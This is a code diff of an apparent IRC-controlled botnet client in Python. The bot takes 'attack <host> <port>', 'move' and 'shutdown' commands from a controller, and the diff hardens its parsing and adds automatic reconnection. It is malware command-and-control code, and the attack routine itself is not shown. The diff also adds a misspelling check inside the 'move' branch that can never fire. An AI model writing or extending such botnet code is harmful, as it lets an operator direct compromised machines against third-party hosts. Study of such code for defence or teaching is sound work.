@@ -146,26 +146,30 @@ class Bot():
 
     def __handle_command(self, msg):
         _, cmd = msg.split(' :')
-        
-        if cmd.startswith('status'):
+        cmd = cmd.split()
+
+        if cmd[0] == 'status':
             try:
                 self.__do_status()
             except ValueError as e:
                 log('Status Command Error: {}'.format(e))
         
-        elif cmd.startswith('shutdown'):
+        elif cmd[0] == 'shutdown':
             try:
                 self.__do_shutdown()
             except ValueError as e:
                 log('Shutdown Command Error: {}'.format(e))
         
-        elif cmd.startswith('attack'):
+        elif cmd[0] == 'attack':
             try:
                 self.__do_attack(cmd)
             except ValueError as e:
                 log('Attack Command Error: {}'.format(e))
         
-        elif cmd.startswith('move'):
+        elif cmd[0] == 'move':
+            if not (cmd[0] == 'move'):
+                # if command is misspelled
+                raise ValueError('Invalid command! {}'.format(cmd[0]))
             try:
                 self.__do_move(cmd)
             except ValueError as e:
@@ -222,11 +226,19 @@ class Bot():
         listens for commands from IRC server
         '''
         while True:
-            msg = self.__receive_message()
+            try:
+                msg = self.__receive_message()
+            except socket.error as e:
+                log('Socket error: {}\nReconnectiong...'.format(e))
+                # reconnect
+                self.__connect_to_irc()
+            except KeyboardInterrupt:
+                log('\nKeyboard interrupt, exiting..')
+                return
             
-            # log(msg)
             if not self.__validate_msg(msg):
                 log('Warning: non-cotroller msg')
+                # log(msg)
                 continue
             
             if self.controller == None:
@@ -248,6 +260,12 @@ class Bot():
                 log('Disconnected from server.')
                 return
             except ValueError as e:
+                log('Handle Command ValueError: {}'.format(e))
+            except socket.error as e:
+                log('Socket error: {}\nReconnectiong...'.format(e))
+                # reconnect
+                self.__connect_to_irc()
+            except Exception as e:
                 log('Handle Command Error: {}'.format(e))
 
     def __do_status(self):
@@ -271,8 +289,11 @@ class Bot():
         perform attack command
         cmd format --> attack <host-name> <port>
         '''
+        if len(cmd) != 3:
+            raise ValueError('Invalid attack command.')
         try:
-            _, target_host, target_port = cmd.split(' ')
+            target_host = cmd[1]
+            target_port = cmd[2]
         except ValueError:
             raise ValueError('Failed to split attack.')
         
@@ -284,9 +305,8 @@ class Bot():
         self.target_host = target_host
 
         log('Attacking {}:{}'.format(self.target_host, self.target_port))
-        # connect to target
+
         self.__connect_to_target()
-        # perform attack
         self.__attack()
         return
         
@@ -311,11 +331,13 @@ class Bot():
         '''
         perform move command
         cmd format --> move <host-name> <port> <channel>
-
-        TODO don't disconnect until successful connection is established
         '''
+        if len(cmd) != 4:
+            raise ValueError('Invalid move command.')
         try:
-            _, host, port, channel = cmd.split(' ')
+            host = cmd[1]
+            port = cmd[2]
+            channel = cmd[3]
         except ValueError:
             raise ValueError('Failed to split move.')
         log('Moving to {}:{}, channel {}'.format(host, int(port), channel))
